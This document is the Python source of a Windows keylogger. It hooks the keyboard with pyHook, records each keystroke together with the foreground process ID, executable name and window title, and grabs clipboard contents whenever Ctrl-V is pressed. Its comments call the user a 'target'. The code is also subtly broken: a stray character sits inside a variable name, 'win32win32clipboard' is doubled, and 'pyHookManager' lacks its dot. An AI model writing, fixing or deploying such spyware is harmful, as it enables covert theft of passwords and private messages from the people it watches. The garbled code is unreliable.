from ctypes import *
import pythoncom
import pyhook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
currentWindow = None

def getCurrentProcess():
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()
    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    # store the current process ID
    process_id = "%d" % pid.value
    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    # now read its title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    # print out the header if we're in the right process
    print('')
    print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_¬title.value))
    print('')
    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    global currentWindow

    # check to see if target changed windows
    if event.WindowName != currentWindow:
        currentWindow = event.WindowName
        getCurrentProcess()
    # if they pressed a standard KeyStroke
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii),)
    else:
        # if [Ctrl-V], get the value on the win32win32clipboard
        if event.key == 'V':
            win32win32clipboard.OpenClipboard()
            pastedValue = win32win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print('[PASTE] - %s' % (pastedValue),)
        else:
            print('[%s]' % event.key)
    # pass execution to next hook registered
    return True

# create and register a hook manager
kl = pyHookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()
